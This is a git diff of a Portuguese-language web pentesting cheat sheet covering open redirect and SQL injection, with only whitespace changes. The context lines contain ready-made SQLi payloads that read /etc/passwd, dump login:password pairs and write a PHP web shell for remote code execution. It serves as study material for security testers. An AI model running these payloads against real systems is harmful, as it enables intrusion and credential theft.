@@ -23,10 +23,8 @@ Com o dirbuster é possível encontrar diretórios e arquivos escondidos no host
 ## Source Code Analysis
 É possível encontrar informações confidenciais através do código fonte da página e das suas subpáginas
 
-
 ## Open Redirect
 Em casos que o redirecionamento é feito pelo parâmetro GET e seja passível de mudar a URL, o hacker pode alterar o link para um site malicioso ou para o que ele desejar. Algumas vezes, o parâmetro de redirecionamento está codificado em base64, MD5, etc. , mas isso também é possível burlar descobrindo a codificação e colocando no parâmetro o link codificado
-
 
 ## SQL Injection
 Para testar se existe um SQL Injection, um método é colocar o contrabarra ou uma aspa simples em campos de input
@@ -35,7 +33,9 @@ Para testar se existe um SQL Injection, um método é colocar o contrabarra ou u
 O Error Based, como o próprio nome diz, é baseado nos erro que retorna ao tentar fazer uma consulta no banco de dados em algum campo. Com ele, é possível injetar códigos SQL para descobrir informações sobre a tabela e o banco de dados.
 
 Exemplo: ' union select 1,2,3... %23'
+
 Exemplo: ' order by 1 or 2 or 3...'
+
 Exemplo: union select 1, column_name, load_file(”/etc/passwd”), 4, from information_schema.columns where table_schema=”database” and table_name=”users” %23
 
 ### Blind
@@ -47,7 +47,9 @@ Exemplo: ' or 1=1 union select 1,2#
 Para descobrir informações confidenciais do servidor através da lógica, é possível utilizar-se da função ascii para descobrir o nome da base de dados em que a aplicações está, por isso é muito comum usar o Burp Suite no modo Repeater para fazer as requisições.
 
 Exemplo: ' or length(database()) = 7 #
+
 Exemplo: ' or ascii(substring(database(),1,1)) == number ascii for letter # 
+
 Exemplo: ' or database() = char(115,116,114,105,110,103) # 
 
 #### SQLi to RCE
@@ -61,6 +63,7 @@ Exemplo: ‘ union all select 1,2,3,4, “<?php system($_GET[’parameter’]); 
 Através do information Schema, é possível obter a tabela com usuários e senhas do sistema e obter as informações contidas nela.
 
 Exemplo: ' union select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema = "string" %23
+
 Exemplo: ' union select 1,2,concat(login,':',senha),4,5 from table %23
 
 ### Bypass addslashes
